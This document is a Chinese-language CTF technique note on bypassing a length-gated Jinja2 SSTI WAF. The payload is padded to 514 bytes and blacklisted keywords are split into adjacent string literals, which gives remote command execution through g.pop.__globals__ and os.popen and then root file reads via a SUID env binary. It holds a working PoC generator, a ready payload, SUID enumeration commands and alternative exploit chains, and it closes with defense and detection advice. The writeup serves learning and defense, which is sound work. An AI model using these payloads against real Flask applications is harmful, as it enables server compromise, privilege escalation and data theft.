---
id: web-python-ssti-length-gated-waf-filler-blacklist-split
title: Jinja2 SSTI 长度分流 WAF 绕过：填充表达式到 514 并拆分黑名单
type: scenario
domain: web
path: web/python/ssti
technique: ssti-length-gated-waf-filler-blacklist-split
aliases:
- SSTI 长度限制绕过
- Jinja2 长度 WAF
- 填充表达式绕过 WAF
- g.pop.__globals__
- __globals__ 字符串拆分
- 514 长度 payload
tags:
- python
- flask
- jinja2
- ssti
- waf-bypass
- length-bypass
- string-concat
- rce
- suid
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:34:42+08:00'
  notes: 已对照原文 WAF 源码、514 长度脚本与 SUID env 提权核对；PoC 未复跑。
---

## 一句话结论

当 Jinja2 SSTI 的 WAF 只在 payload 长度恰好为 114 或 514 时启用关键字黑名单、否则删除左括号 `(` 时，可以把利用表达式用无副作用的算术表达式填充到 514 字节，并用相邻字符串字面量拆分 `__globals__`、`__import__` 等黑名单词，经 `g.pop` 取到函数对象的 globals，最终执行 `os.popen` 读取命令输出。

## 原理

- WAF 逻辑是长度分流：`len(payload) not in (114, 514)` 时只做 `payload.replace("(", "")`，否则才检查黑名单。前者把所有函数调用语法破坏掉，后者虽然保留括号，但会拦截 `__class__`、`__globals__`、`import`、`self`、`session`、`lipsum` 等常见链关键字。
- 两个分支各有一个绕过点：把 payload 精确填充到 514 字节即可进入“只查黑名单、不删括号”的分支；黑名单只匹配连续子串，用 Jinja 的相邻字符串字面量拼接可在运行时还原关键字，而源码/请求中不出现连续关键字。
- 例如 `'_''_globals__'` 在 Jinja 中解析为两个相邻字符串字面量，运行时拼接成 `'__globals__'`；`'__i''mport__'` 拼接成 `'__import__'`。黑名单里的 `__globals__`、`import` 都不会命中。
- `g` 是 Flask 模板全局（应用上下文代理）。`g.pop` 是 `_AppCtxGlobals.pop` 绑定方法；Jinja 的下标访问 `g.pop['__globals__']` 在对象不支持 `__getitem__` 时会回退到 `getattr`，等价于 `g.pop.__globals__`，拿到定义 `pop` 的模块全局字典。该字典里的 `__builtins__` 可继续取 `__import__`，从而导入 `os`。
- 最后用 `os.popen('ls /').read()` 回显；若要执行命令，把 `ls /` 换成 `env`、`cat /flag` 等。填充部分用 `{{111...}}` 这类纯数字算术表达式，不含括号和黑名单词，同时把总长度补到 514。
- 该题还从 Dockerfile 发现 `/usr/local/bin/env` 被 `chmod 4755`，即 SUID root 的 `env`；拿到命令执行后再用 `/usr/local/bin/env cat /flag` 以 root 权限读 flag，属于同一链的提权步骤。

## 触发条件

- 应用把用户输入（如注册用户名、昵称、查询参数）拼接进 `render_template_string`，形成 Jinja2 SSTI。
- WAF 采用长度分支或只对特定长度启用黑名单，且不在运行期做 AST/语义分析。
- 黑名单只匹配连续子串，未禁止字符串字面量拼接、下标回退或 `g`/`pop` 等非典型入口。
- 模板上下文暴露 Flask `g`、`config`、`request` 等对象，且 Jinja 未启用严格沙箱。
- 目标容器内存在可执行命令的 Python 环境，或另有 SUID 程序可用于提权。

## 利用步骤

1. 用 `{{7*7}}` 确认模板求值；观察不同长度 payload 的行为，判断是否存在“长度不匹配就删括号/放行”的分支。
2. 构造核心表达式，避开黑名单：用 `g.pop['__globals__']` 取 globals，用 `'__i''mport__'` 取导入函数。
3. 计算核心表达式长度，用不含括号/黑名单词的算术表达式填充到 514 字节，例如 `{{111...}}`。
4. 发送 payload，读取 `popen('ls /')` 的输出；确认命令执行后读取 `env`、`/flag` 等。
5. 若需要 root，检查 SUID：`find / -perm -4000 -print 2>/dev/null`；发现 SUID `env` 时执行 `/usr/local/bin/env cat /flag`。

## PoC

```python
# 核心 payload（不含填充）
core = "{{((g.pop['_''_globals__'].__builtins__['__i''mport__']('os')).popen('ls /')).read()}}"
# 填充到 514 字节；{{ 与 }} 共 6 字节，其余用纯数字
fill = "1" * (514 - len(core) - 6)
payload = core + "{{ " + fill + " }}"
print(len(payload))  # 514
print(payload)
```

简化后的手工表达式：

```jinja2
{{((g.pop['_''_globals__'].__builtins__['__i''mport__']('os')).popen('env')).read()}}{{1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111}}
```

（上面的填充需按实际核心长度计算；用脚本生成可保证恰好 514。）

SUID 提权：

```bash
find / -perm -4000 -print 2>/dev/null
/usr/local/bin/env cat /flag
```

## 变体与关联

- 变体：长度不是 114/514 而是任意值，可先测出“触发黑名单”的长度集合，再用多个填充分支命中；若只删括号，可用 `{% set %}`、过滤器、属性访问等无括号语法，或把调用拆成 `|attr`。
- 变体：不用 `g.pop`，可用 `config.__init__.__globals__`、`request.application.__globals__`、`cycler.__init__.__globals__`（若未被黑名单）；`__globals__` 被拦时用 `['__glo'+'bals__']`、`|attr`、`__getattribute__` 等。
- 变体：黑名单覆盖 `pop`/`g` 时，从其他函数对象（`url_for`、`get_flashed_messages`）取 `__globals__`；最终目标都是 `os`/`subprocess`。
- 关联：[[web-generic-ssti-waf-string-concat-eq-globals-bypass]]（字符串拼接 + `__eq__` 取 globals）、[[web-python-ssti-getattr-chr-blacklist-bypass]]（关键字拆分）、[[pentest-privilege-escalation-suid-gtfobins-shell-escape]]（SUID GTFOBins 提权）。
- 边界：WAF 对所有长度都做 AST 检查、Jinja 启用 `SandboxedEnvironment`、模板上下文不暴露任何可达 globals 的对象、或目标无命令执行权限时，本链失效。

## 检测与防御

- 不要用“长度分支 + 关键字黑名单”做 SSTI 防护；这是可预测的绕过面。应禁止把用户输入拼接进模板，使用固定模板与转义后的参数。
- 使用 Jinja2 `SandboxedEnvironment`，移除 `g`、`config`、`request` 等敏感全局，禁用 `__globals__`、`__builtins__`、`popen` 等属性/方法。
- 若必须允许表达式，使用 AST 白名单（只允许字面量、算术、白名单函数），并在独立低权限进程中执行。
- 移除不必要的 SUID 位（尤其 `env`、`find`、`python` 等 GTFOBins），容器以非 root 运行。
- 检测：请求中出现 `{{`/`}}`、`__globals__` 拆分、`g.pop`、`__builtins__`、`popen`、`os`；同一参数反复出现长度接近 114/514 的请求；模板渲染后出现命令输出；`find -perm -4000` 类探测与 SUID 程序异常执行。
